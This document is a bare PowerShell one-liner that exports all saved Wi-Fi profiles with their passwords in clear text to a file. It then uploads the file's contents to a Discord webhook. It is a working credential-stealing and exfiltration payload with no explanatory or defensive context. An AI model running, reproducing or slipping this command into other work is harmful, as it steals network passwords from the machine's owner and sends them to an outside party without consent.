netsh wlan show profiles | % { netsh wlan show profile name="$_" key=clear } > $env:USERPROFILE\wifipass.txt; $w='https://discord.com/api/webhooks/...'; $f=Get-Content $env:USERPROFILE\wifipass.txt -Raw; $b=ConvertTo-Json @{content="```$f```"}; Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json'
